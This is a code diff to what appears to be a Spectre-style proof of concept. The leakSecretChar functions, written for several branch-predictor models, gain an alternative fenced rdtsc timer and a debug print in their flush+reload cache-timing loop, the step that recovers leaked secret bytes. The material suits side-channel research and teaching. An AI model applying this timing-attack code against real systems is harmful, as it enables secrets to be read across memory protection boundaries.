@@ -54,13 +54,27 @@ uint8_t leakSecretChar(size_t OOB_index, NBitSmithPredictor* pred, uint64_t cach
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            t1 = __rdtscp(&aux); // Get timer start
-            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-            t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-        
+            #ifndef ALLOW_RDTSCP
+                t1 = __rdtscp(&aux); // Get timer start
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
+            #else
+                _mm_mfence();
+                t1 = __rdtsc(); // Get timer start
+                _mm_mfence();
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                _mm_mfence();
+                t2 = __rdtsc() - t1; // Get timer elapsed
+                _mm_mfence();
+            #endif
+
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
             }
+
+            #ifdef DEBUG_HIT_THRESHOLD
+                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
+            #endif
         }
 
         // Grab the top two counts to compare for early exit condition
@@ -145,13 +159,27 @@ uint8_t leakSecretChar(size_t OOB_index, BimodalPredictor* pred, uint64_t cache_
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            t1 = __rdtscp(&aux); // Get timer start
-            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-            t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-        
+            #ifndef ALLOW_RDTSCP
+                t1 = __rdtscp(&aux); // Get timer start
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
+            #else
+                _mm_mfence();
+                t1 = __rdtsc(); // Get timer start
+                _mm_mfence();
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                _mm_mfence();
+                t2 = __rdtsc() - t1; // Get timer elapsed
+                _mm_mfence();
+            #endif
+
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
             }
+
+            #ifdef DEBUG_HIT_THRESHOLD
+                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
+            #endif
         }
 
         // Grab the top two counts to compare for early exit condition
@@ -236,13 +264,27 @@ uint8_t leakSecretChar(size_t OOB_index, GSharePredictor* pred, uint64_t cache_h
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            t1 = __rdtscp(&aux); // Get timer start
-            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-            t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-        
+            #ifndef ALLOW_RDTSCP
+                t1 = __rdtscp(&aux); // Get timer start
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
+            #else
+                _mm_mfence();
+                t1 = __rdtsc(); // Get timer start
+                _mm_mfence();
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                _mm_mfence();
+                t2 = __rdtsc() - t1; // Get timer elapsed
+                _mm_mfence();
+            #endif
+
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
             }
+
+            #ifdef DEBUG_HIT_THRESHOLD
+                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
+            #endif
         }
 
         // Grab the top two counts to compare for early exit condition
@@ -327,13 +369,27 @@ uint8_t leakSecretChar(size_t OOB_index, HybridPredictor* pred, uint64_t cache_h
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            t1 = __rdtscp(&aux); // Get timer start
-            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-            t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-        
+            #ifndef ALLOW_RDTSCP
+                t1 = __rdtscp(&aux); // Get timer start
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
+            #else
+                _mm_mfence();
+                t1 = __rdtsc(); // Get timer start
+                _mm_mfence();
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                _mm_mfence();
+                t2 = __rdtsc() - t1; // Get timer elapsed
+                _mm_mfence();
+            #endif
+
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
             }
+
+            #ifdef DEBUG_HIT_THRESHOLD
+                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
+            #endif
         }
 
         // Grab the top two counts to compare for early exit condition
@@ -421,13 +477,27 @@ uint8_t leakSecretChar(size_t OOB_index, BasePredictor* pred, uint64_t cache_hit
         for (i = 0; i < 256; i++) {
             random_i = indices[i];
 
-            t1 = __rdtscp(&aux); // Get timer start
-            dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
-            t2 = __rdtscp(&aux) - t1; // Get timer elapsed
-        
+            #ifndef ALLOW_RDTSCP
+                t1 = __rdtscp(&aux); // Get timer start
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
+            #else
+                _mm_mfence();
+                t1 = __rdtsc(); // Get timer start
+                _mm_mfence();
+                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
+                _mm_mfence();
+                t2 = __rdtsc() - t1; // Get timer elapsed
+                _mm_mfence();
+            #endif
+
             if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                 results[random_i]++;
             }
+
+            #ifdef DEBUG_HIT_THRESHOLD
+                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
+            #endif
         }
 
         // Grab the top two counts to compare for early exit condition
